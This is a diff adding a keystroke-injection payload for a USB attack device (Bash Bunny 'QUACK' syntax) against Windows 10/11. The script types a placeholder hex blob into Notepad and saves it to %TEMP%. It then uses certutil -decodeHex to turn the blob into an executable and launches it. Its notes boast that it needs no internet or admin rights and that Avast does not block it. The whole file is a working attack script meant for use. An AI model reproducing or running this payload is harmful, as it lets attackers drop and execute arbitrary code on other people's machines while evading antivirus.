@@ -1,0 +1,53 @@
+* REM ###########################################################################################
+* REM #                                                                                         #
+* REM # Title        : Install And Run Any Arbitrary Executable - No Internet And Root Needed   #
+* REM # Author       : Aleff                                                                    #
+* REM # Version      : 1.0                                                                      #
+* REM # Category     : Execution                                                                #
+* REM # Target       : Windows 10/11                                                            #
+* REM #                                                                                         #
+* REM ###########################################################################################
+
+ATTACKMODE HID
+
+QUACK REM REQUIREMENTS
+* REM- Nothing
+
+QUACK REM NOTE
+* REM - Tested on Windows 11
+* REM - Running checked but not blocked by Avast antivirus
+
+QUACK REM VARIABLES
+* REM Define here your hexadecimal code
+HEX_CODE='example'
+
+QUACK DELAY 1500
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING notepad.exe
+QUACK ENTER
+QUACK DELAY 2000
+QUACK STRING $HEX_CODE
+QUACK DELAY 2000
+QUACK ALT F
+QUACK DELAY 1000
+QUACK STRING S
+QUACK DELAY 1000
+QUACK STRING \"%TEMP%\example.hex\"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING certutil -f -decodeHex \"%TEMP%\example.hex\" \"%TEMP%\example.exe\"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 250
+QUACK STRING \"%TEMP%\example.exe\"
+QUACK ENTER
